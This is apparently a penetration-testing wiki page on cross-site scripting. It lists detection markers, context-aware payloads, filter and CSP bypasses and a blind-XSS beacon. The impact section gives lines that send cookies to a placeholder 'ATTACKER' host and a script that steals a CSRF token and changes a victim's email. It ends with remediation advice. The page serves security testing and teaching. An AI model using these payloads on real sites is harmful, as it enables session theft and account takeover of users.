---
tags:
  - Web
---

# :material-language-javascript: Cross-Site Scripting (XSS)

<span class="pill pill-medium">common</span> <span class="pill pill-info">web</span>

**XSS** lets you execute JavaScript in another user's browser in the context of the target origin. That means stealing sessions, keylogging, rewriting the page, or driving account takeover.

!!! abstract "TL;DR"
    Find where your input is reflected/stored, figure out the **HTML context** it lands in, and break out of that context to inject a `<script>` or event handler.

## :material-shape: The three types

| Type | Where the payload lives | Trigger |
| --- | --- | --- |
| **Reflected** | In the immediate response (URL/param) | Victim clicks your crafted link |
| **Stored** | Saved server-side (comment, profile) | Any user who views the page |
| **DOM-based** | Never touches the server; client JS sinks | Fragment / client-side routing |

## :material-magnify: Detection

Inject a unique marker and see where it lands **unencoded**:

```html
xsspoc1337
"><svg/onload=alert(document.domain)>
'"><img src=x onerror=alert(1)>
javascript:alert(1)
```

Then view source / the DOM: is your marker inside a tag, an attribute, a `<script>` block, or an HTML comment? The context decides the payload.

## :material-code-tags: Context-aware payloads

=== "HTML body"

    ```html
    <script>alert(document.domain)</script>
    <img src=x onerror=alert(document.domain)>
    <svg onload=alert(document.domain)>
    ```

=== "Inside an attribute"

    ```html
    " autofocus onfocus=alert(1) x="
    "><script>alert(1)</script>
    ' onmouseover='alert(1)
    ```

=== "Inside <script>"

    ```javascript
    </script><script>alert(1)</script>
    ';alert(1);//
    ${alert(1)}      // template literal context
    ```

=== "DOM sink"

    Look for input flowing into dangerous sinks:
    ```javascript
    element.innerHTML = location.hash        // sink
    document.write(location.search)
    eval(userControlled)
    // Source examples: location.hash, location.search, document.referrer, postMessage
    ```

## :material-filter: WAF / filter bypass

<span class="pill pill-hard">when the easy stuff is blocked</span>

```html
<!-- Case & no parentheses -->
<sVg/OnLoAd=alert`1`>
<!-- Encoded event handlers -->
<img src=x onerror=&#97;lert(1)>
<!-- No spaces (use slashes/newlines) -->
<img/src/onerror=alert(1)>
<!-- Nested to defeat naive tag stripping -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- Exotic tags/events -->
<details/open/ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

!!! tip "HTML5 event-handler cheat"
    When `<script>` is filtered, event handlers on `svg`, `img`, `body`, `details`, `video`, `iframe`, and `input` are your friends. [PortSwigger's XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) is the canonical list.

## :material-alert-decagram: Edge cases & gotchas

=== "Tricky contexts"

    | Your input lands in… | You must first… |
    | --- | --- |
    | `<textarea>`, `<title>`, `<noscript>` | close the tag: `</textarea><svg onload=…>` |
    | inside an HTML comment `<!-- x -->` | close it: `--><svg onload=…>` |
    | a JS string `var a='X'` | break out **and** balance quotes: `';alert(1)//` |
    | a URL attribute (`href`, `src`) | `javascript:alert(1)` (no tag breakout needed) |
    | an existing `on*` handler value | just inject JS, no `<`/`>` available |

=== "CSP bypass"

    A CSP blocking inline script isn't game-over:

    - **JSONP endpoints** on an allowlisted host: `<script src="//allowed/api?callback=alert">`.
    - **`unsafe-eval` present** → gadget via a templating lib already on the page (Angular, etc.).
    - **Missing `base-uri`** → inject `<base href="//evil">` to hijack relative script loads.
    - **`nonce` reuse / predictable nonce** → reuse it.
    - **Dangling-markup** exfil when script is fully blocked: `<img src='//evil/?` swallows
      the rest of the page (including a CSRF token) as the URL.

=== "mXSS & DOMPurify"

    **Mutation XSS**: the browser re-parses `innerHTML` and *mutates* your markup
    into something executable that the sanitizer didn't see (e.g. inside
    `<svg>`/`<math>` foreign-content, or `<noscript>` toggling). Sanitizer version
    matters — old DOMPurify has known bypasses. Always note the exact library +
    version in your report.

=== "Blind & length-limited"

    - **Blind XSS** (fires later in an admin panel, support ticket, log viewer):
      plant a beacon payload and wait — `"><script src=//xss.report/x></script>`.
      Use an XSS-hunter-style catcher that reports DOM + cookies + URL.
    - **Length-limited field**: load the real payload externally with the shortest
      possible bootstrap — `<script src=//x.x>` or `<svg onload=eval(name)>` then
      stash the code in `window.name`.

!!! bug "Why it reflects but won't fire"
    - **It's double-encoded** — you see `&lt;svg` in the DOM, not `<svg`. The app
      encoded once, the browser decoded once; you need it to reach the parser raw.
    - **The sink is a *text* sink** (`textContent`, `innerText`, `setAttribute` on a
      non-URL attr) — reflection ≠ execution. Look for `innerHTML`, `outerHTML`,
      `document.write`, `eval`, `setTimeout(string)`, `location=`, jQuery `$(html)`.
    - **`SameSite=Lax` (the modern default)** blocks your cross-site cookie
      auto-send for CSRF-style follow-ups, but same-origin XSS JS still carries the
      cookie — pivot to in-page actions.
    - **Framework auto-escape** (React/Vue/Angular) neutralizes most reflection —
      hunt the escape hatches: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`,
      `bypassSecurityTrustHtml`, or client-side template injection (`{{7*7}}`).

## :material-flash: Turning XSS into impact

Not `alert(1)` in a report — show real impact.

!!! loot "Session / cookie theft"
    ```javascript
    // Exfil non-HttpOnly cookies to your listener
    new Image().src='https://ATTACKER/c?'+encodeURIComponent(document.cookie);
    // Or full request-capable exfil
    fetch('https://ATTACKER/c',{method:'POST',body:document.cookie});
    ```
    Catch it with `python3 -m http.server` or an interactsh/Burp Collaborator URL.

!!! loot "Account takeover via CSRF-token theft"
    ```javascript
    fetch('/account',{credentials:'include'})
      .then(r=>r.text())
      .then(html=>{
        const t = html.match(/csrf" value="([^"]+)"/)[1];
        // now submit an email/password change with the stolen token
        fetch('/account/email',{method:'POST',credentials:'include',
          headers:{'Content-Type':'application/x-www-form-urlencoded'},
          body:`csrf=${t}&email=attacker@evil.com`});
      });
    ```

!!! opsec "HttpOnly stops cookie theft, not XSS"
    If cookies are `HttpOnly`, pivot to **in-browser actions** (change email, add API key, read data) rather than exfiltrating the cookie. The session is still yours while the JS runs.

## :material-shield-check: Remediation

- **Context-aware output encoding** (HTML, attribute, JS, URL — different each).
- A strict **Content-Security-Policy** (`script-src 'self'`, nonces, no `unsafe-inline`).
- `HttpOnly` + `Secure` + `SameSite` cookies.
- Frameworks that auto-escape (React, modern templating) — but watch `dangerouslySetInnerHTML`.

## :material-link-variant: Related

- Pairs with [Auth Bypass](auth-bypass.md) for full account takeover.
- CSP bypass research overlaps with [SSRF](ssrf.md) exfil techniques.
- Reference: [OWASP XSS](https://owasp.org/www-community/attacks/xss/).
